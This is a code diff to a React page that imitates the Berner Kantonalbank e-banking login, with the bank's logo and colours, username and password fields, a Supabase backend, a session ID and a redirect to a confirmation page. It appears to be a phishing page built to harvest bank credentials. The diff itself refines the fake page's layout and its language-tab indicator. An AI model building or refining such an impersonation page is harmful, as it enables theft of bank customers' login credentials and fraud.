@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef, useLayoutEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
@@ -64,6 +64,25 @@ const ChBernerKantonalbank = () => {
 
   const langs: Lang[] = ["DE", "FR", "EN"];
 
+  const greenLineRef = useRef<HTMLDivElement | null>(null);
+  const buttonRefs = useRef<Record<Lang, HTMLButtonElement | null>>({ DE: null, FR: null, EN: null });
+  const [indicator, setIndicator] = useState<{ left: number; width: number }>({ left: 0, width: 0 });
+
+  useLayoutEffect(() => {
+    const update = () => {
+      const btn = buttonRefs.current[lang];
+      const line = greenLineRef.current;
+      if (!btn || !line) return;
+      const b = btn.getBoundingClientRect();
+      const l = line.getBoundingClientRect();
+      const pad = 8;
+      setIndicator({ left: b.left - l.left - pad, width: b.width + pad * 2 });
+    };
+    update();
+    window.addEventListener("resize", update);
+    return () => window.removeEventListener("resize", update);
+  }, [lang]);
+
   return (
     <>
       {showLoading && (
@@ -72,41 +91,45 @@ const ChBernerKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-white text-black">
+      <div className="flex flex-col bg-white text-black">
         {/* Header */}
         <header className="relative">
           <div className="max-w-[1200px] mx-auto px-6 md:px-20">
             <div className="h-1.5" style={{ backgroundColor: RED }} />
-            <div className="flex justify-between items-start pt-8 pb-6">
+            <div className="flex pt-8">
               <img src={logoAsset.url} alt="BEKB | BCBE" className="h-7 md:h-8" />
-              <nav className="relative flex gap-6 text-[14px]">
+            </div>
+            <div className="flex justify-end pb-2 pt-4">
+              <nav className="flex gap-6 text-[14px]">
                 {langs.map((l) => (
                   <button
                     key={l}
+                    ref={(el) => (buttonRefs.current[l] = el)}
                     onClick={() => setLang(l)}
-                    className="relative"
                     style={{ color: lang === l ? "#000" : "#999" }}
                   >
                     {l}
-                    {lang === l && (
-                      <span
-                        aria-hidden
-                        className="absolute left-1/2 -translate-x-1/2 h-[8px] w-11"
-                        style={{ backgroundColor: DARK, top: "calc(100% + 24px)" }}
-                      />
-                    )}
                   </button>
                 ))}
               </nav>
             </div>
           </div>
-          {/* Grüne Linie full width */}
-          <div className="h-[8px] w-full" style={{ backgroundColor: GREEN }} />
+          {/* Grüne Linie full width mit Indicator innen */}
+          <div ref={greenLineRef} className="relative h-[8px] w-full" style={{ backgroundColor: GREEN }}>
+            <div className="max-w-[1200px] mx-auto px-6 md:px-20 h-full relative">
+              <span
+                aria-hidden
+                className="absolute inset-y-0 transition-all"
+                style={{ backgroundColor: DARK, left: indicator.left, width: indicator.width }}
+              />
+            </div>
+          </div>
         </header>
 
+        {/* Wrapper für initialen Viewport — Footer erst nach Scroll */}
+        <div className="min-h-screen flex flex-col">
+        <section className="flex-1 flex flex-col">
 
-        {/* Above-the-fold Section: füllt mind. viewport, Footer erst nach Scroll */}
-        <section className="min-h-screen flex flex-col">
           <div className="max-w-[1200px] w-full mx-auto px-6 md:px-20 pt-12 flex-1">
             <div
               className="inline-block pb-2 mb-10 text-[15px] font-bold"
@@ -172,22 +195,33 @@ const ChBernerKantonalbank = () => {
                   der BEKB | BCBE für das E-Banking.
                 </p>
 
-                <button
-                  onClick={handleSubmit}
-                  className="mt-6 w-full max-w-[320px] h-12 text-[15px] text-black transition-colors hover:brightness-95"
-                  style={{ backgroundColor: GREEN }}
-                >
-                  Weiter
-                </button>
+                {(() => {
+                  const active = benutzer.length > 0 && passwort.length > 0;
+                  return (
+                    <button
+                      onClick={handleSubmit}
+                      className="mt-6 block w-full max-w-[320px] h-10 text-[15px] transition-colors"
+                      style={{
+                        backgroundColor: active ? RED : GREEN,
+                        color: active ? "#ffffff" : DARK,
+                      }}
+                    >
+                      Weiter
+                    </button>
+                  );
+                })()}
 
-                <a
-                  href="#"
-                  className="mt-6 inline-flex items-center gap-2 text-[14px] font-normal"
-                  style={{ color: RED }}
-                >
-                  <ChevronRight size={14} strokeWidth={3} />
-                  E-Banking Schritt für Schritt einrichten
-                </a>
+                <div className="mt-4 max-w-[320px]">
+                  <a
+                    href="#"
+                    className="inline-flex items-center gap-2 text-[14px] font-normal"
+                    style={{ color: RED }}
+                  >
+                    <ChevronRight size={14} strokeWidth={3} />
+                    E-Banking Schritt für Schritt einrichten
+                  </a>
+                </div>
+
               </div>
 
               {/* Nützliche Links */}
@@ -228,6 +262,8 @@ const ChBernerKantonalbank = () => {
           </div>
 
         </section>
+        </div>
+
 
         {/* Footer */}
         <footer className="text-white" style={{ backgroundColor: FOOTER_BG }}>
